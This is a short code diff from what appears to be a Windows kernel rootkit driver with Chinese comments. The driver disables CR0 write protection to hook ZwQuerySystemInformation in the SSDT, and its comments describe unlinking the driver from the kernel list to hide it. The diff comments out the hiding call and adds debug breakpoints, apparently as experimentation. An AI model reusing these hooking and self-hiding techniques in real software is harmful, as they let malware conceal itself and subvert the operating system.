@@ -131,7 +131,7 @@ NTSTATUS newZwQuerySystemInformation(
 //几个关键数据结构的定义
 #pragma pack(1)
 typedef struct  ServiceDescriptorEntry {
-	DWORD *KiServiceTable;
+	DWORD *KiServiceTable;//SSDT地址
 	DWORD* CounterBaseTable;
 	DWORD nSystemCalls;
 	DWORD* KiArgumentTable;
@@ -388,12 +388,15 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath)
 
 	//修改内核对象DriverObject的DRIVER_SECTION
 	//将其从双链表上摘除以隐藏驱动自身
-	HideDriver(DriverObject);
+	//HideDriver(DriverObject);
+
+	KdBreakPoint();
 
 	disableWP_cr0();
 	//oldZwQuerySystemInformation = hookSSDT(ulSSDTFunctionIndex, newZwQuerySystemInformation, SSDTcallTable);
 	hookSSDT(ulSSDTFunctionIndex, newZwQuerySystemInformation, SSDTcallTable);
 	enableWP_cr0();
+	KdBreakPoint();
 
 	return(STATUS_SUCCESS);
 }
